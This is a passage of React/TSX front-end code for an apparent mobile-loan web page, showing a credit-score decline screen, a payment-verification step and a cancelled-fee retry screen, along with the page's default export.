                     <div className="text-center mb-6">
                        <div className="inline-flex items-center justify-center w-28 h-28 rounded-full border-8 border-slate-100 border-t-red-500 transform -rotate-45 relative">
                           <div className="transform rotate-45 text-center absolute inset-0 flex flex-col items-center justify-center">
                              <span className="block text-3xl font-black text-slate-900">620</span>
                              <span className="block text-[10px] text-red-500 font-bold uppercase">Poor</span>
                           </div>
                        </div>
                        <p className="text-xs text-slate-500 mt-4">Unsecured loan requirement: <span className="font-bold text-slate-900">700+</span></p>
                     </div>

                     <div className="bg-slate-50 p-3 rounded-lg border border-slate-100">
                         <h4 className="font-bold text-slate-900 text-[10px] uppercase mb-1">Reason for Decline</h4>
                         <p className="text-[10px] text-slate-500 leading-relaxed">
                             High debt-to-income ratio detected. Active loans found on other mobile lending platforms.
                         </p>
                     </div>
                  </div>
                </div>

                <div className="space-y-3">
                    <Button onClick={() => setStep('select')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
                        Apply for Lower Amount
                    </Button>
                </div>
             </div>
        )}

      {/* ================= STEP 10: RECOVERY/FAILED ================= */}
      {step === 'payment_check' && selectedTier && (
          <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
            <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <SearchCheck className="w-10 h-10 text-yellow-600" />
            </div>
            <h2 className="text-2xl font-black text-slate-900 mb-2">Checking Payment</h2>
            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6 space-y-4">
              {errorMsg && <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold"><AlertCircle className="w-4 h-4" /> {errorMsg}</div>}
              <Button onClick={handleManualFetch} disabled={manualCheckLoading} className="w-full h-14 bg-emerald-600 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2">
                  {manualCheckLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <SearchCheck className="w-5 h-5" />}
                  <span>Verify Again</span>
              </Button>
              <Button onClick={handleRetrySamePayment} variant="outline" className="w-full h-14 border-2 font-bold rounded-xl"><RefreshCcw className="w-4 h-4 mr-2" /> Retry</Button>
            </div>
          </div>
      )}

      {step === 'failed' && selectedTier && (
         <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><XCircle className="w-10 h-10 text-orange-500" /></div>
            <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Cancelled</h2>
            <p className="text-slate-500 font-medium mb-8 px-4">Fee of <span className="font-bold text-slate-900">KES {selectedTier.fee}</span> was not received.</p>
            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
                <Button onClick={() => setStep('summary')} className="w-full h-12 bg-emerald-500 text-white font-bold rounded-xl flex items-center justify-center gap-2 shadow-lg"><RefreshCcw className="w-4 h-4" /> Retry Payment</Button>
            </div>
         </div>
      )}
    </div>
  );
}

export default function QuickLoansPage() {
    return (
        <div className="min-h-screen bg-slate-50/50 font-sans text-slate-900">
            <Suspense fallback={<div className="p-10 text-center"><Loader2 className="animate-spin w-8 h-8 mx-auto text-slate-300"/></div>}>
                <QuickLoansContent />
            </Suspense>
        </div>
    )
}